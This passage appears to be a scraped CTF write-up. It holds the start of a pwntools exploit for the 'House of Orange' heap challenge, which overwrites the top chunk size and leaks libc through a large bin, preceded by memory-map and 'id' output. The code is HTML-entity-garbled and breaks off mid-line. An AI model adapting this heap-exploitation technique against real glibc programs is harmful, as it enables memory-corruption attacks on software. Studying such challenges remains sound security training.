0 r--p 00025000 08:01 2626455 /lib/x86_64-linux-gnu/ld-2.23.so7fbfa936d000-7fbfa936e000 rw-p 00026000 08:01 2626455 /lib/x86_64-linux-gnu/ld-2.23.so7fbfa936e000-7fbfa936f000 rw-p 00000000 00:00 0 7ffc73a63000-7ffc73a84000 rw-p 00000000 00:00 0 [stack]7ffc73b8c000-7ffc73b8f000 r--p 00000000 00:00 0 [vvar]7ffc73b8f000-7ffc73b91000 r-xp 00000000 00:00 0 [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall]$ iduid=1000(giantbranch) gid=1000(giantbranch) groups=1000(giantbranch) exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-12-29 14:03:27# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : # struct house&#123;# struct orange* point;# qword* name;# &#125;# struct orange&#123;# dword price# dword color;# &#125;from pwn import *# context.log_level = &quot;debug&quot;p = process(&quot;./houseoforange_22785bece84189e632567da38e4be0e0c4bb1682&quot;)libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;) # 1. Red # 2. Green # 3. Yellow # 4. Blue # 5. Purple # 6. Cyan # 7. White def build(nameLen, name, price, color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Length of name :&quot;) p.sendline(str(nameLen)) p.recvuntil(&quot;Name :&quot;) p.send(name) p.recvuntil(&quot;Price of Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Color of Orange:&quot;) p.sendline(str(color))def see(): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;2&quot;)def upgrade(nameLen, name, price, color): p.recvuntil(&quot;Your choice : &quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Length of name :&quot;) p.sendline(str(nameLen)) p.recvuntil(&quot;Name:&quot;) p.send(name) p.recvuntil(&quot;Price of Orange:&quot;) p.sendline(str(price)) p.recvuntil(&quot;Color of Orange:&quot;) p.sendline(str(color))def getpid(): print proc.pidof(p)[0] pause()main_arena_offset = 0x3c4b20######### overwrite top chunk sizebuild(0x10, &quot;A&quot;*0x10, 10, 1)upgrade(0x40, &quot;A&quot;*0x10+ p64(0) + p64(0x21) + p64(0x0000001f0000000a) + p64(0) * 2 + p64(0xfa1), 10 , 1)# let top chunk to unsort bin listbuild(0xfb0, &quot;A&quot;*0x10, 10, 1)######### leak libc# in 64 bit, must malloc more than 0x3e9 to get large binbuild(0x400, &quot;A&quot;*8, 10, 1)# build(0x3e9, &quot;A&quot;*8, 10, 1)see()p.recvuntil(&quot;Name of house : AAAAAAAA&quot;)largebin_leak = u64(p.recvuntil(&quot;
